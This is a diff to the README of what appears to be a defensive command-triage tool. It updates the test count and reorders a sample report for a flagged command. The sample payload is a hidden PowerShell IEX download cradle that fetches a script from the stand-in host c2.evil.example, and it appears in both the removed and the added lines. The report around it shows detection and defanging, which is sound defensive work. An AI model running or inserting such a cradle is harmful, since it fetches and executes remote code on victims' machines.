@@ -6,7 +6,7 @@
 
 [![Python 3.10+ stdlib-only](https://img.shields.io/badge/python-3.10%2B%20stdlib--only-blue.svg)](#)
 [![Dependencies: Zero](https://img.shields.io/badge/dependencies-zero-009688.svg)](#)
-[![Tests](https://img.shields.io/badge/tests-149%20passed-success.svg)](#)
+[![Tests](https://img.shields.io/badge/tests-150%20passed-success.svg)](#)
 [![FPR: 0.0000](https://img.shields.io/badge/FPR-0.0000%20(67%20fixtures)-brightgreen.svg)](#)
 
 [Quickstart](#quickstart) · [Architecture](#architecture) · [Detection Rigidity](#detection-rigidity) · [CLI Reference](#cli-reference) · [ADRs](docs/adr/README.md)
@@ -92,26 +92,23 @@ cmd-unmask --benchmark -v
 | Triage Verdict [cli] | Severity: HIGH (70/100)                             |
 +----------------------------------------------------------------------------+
 | Exec Brief    : C2/Ingress: external network target(s)                     |
-|                 http://c2.evil.example:8080/stage.ps1, c2.evil.example.    |
-|                 Key flags: -NoP / -NoProfile.                              |
+|                 http://c2.evil.example:8080/stage.ps1, c2.evil.example...  |
 +----------------------------------------------------------------------------+
 
-[1] PAYLOAD
-  +-- powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
+[1] FINDINGS & EVIDENCE
+  - T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
+  - T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 0 [Raw Input])
+  - [CAPABILITY] Network: Net.WebClient
+  - [CAPABILITY] Network: DownloadString
+  - [RATIONALE] HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
 
-[2] BEHAVIORAL EVIDENCE & CAPABILITIES
-  |-- T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
-  |-- T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 0 [Raw Input])
-  |-- [CAPABILITY] Network: Net.WebClient
-  |-- [CAPABILITY] Network: DownloadString
-  +-- [RATIONALE] HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
+[2] IOCs & NEXT STEPS
+  - [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (DEFANGED, from Step 0 [Raw Input])
+  - [domain] c2[.]evil[.]example (DEFANGED, from Step 0 [Raw Input])
+  1. Hunt and block network target(s) (hxxp://c2[.]evil[.]example[:]8080/stage.ps1, c2[.]evil[.]example) across firewall, proxy, and DNS logs.
 
-[3] EXTRACTED IOCs (DEFANGED)
-  |-- [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (from Step 0 [Raw Input])
-  +-- [domain] c2[.]evil[.]example (from Step 0 [Raw Input])
-
-[4] RECOMMENDED L1/L2 NEXT STEPS
-  +-- 1. Hunt and block network target(s) (hxxp://c2[.]evil[.]example[:]8080/stage.ps1, c2[.]evil[.]example) across firewall, proxy, and DNS logs.
+[3] PAYLOAD
+  powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
 ```
 
 ---
@@ -189,7 +186,7 @@ Matches `python -m cmd_unmask --help`:
 ### Development & Testing
 
 ```bash
-# Run full unit and integration test suite (149 tests)
+# Run full unit and integration test suite (150 tests)
 python -m unittest discover -s tests -v
 
 # Run Regression Corpus benchmark and Detection Rigidity Gate
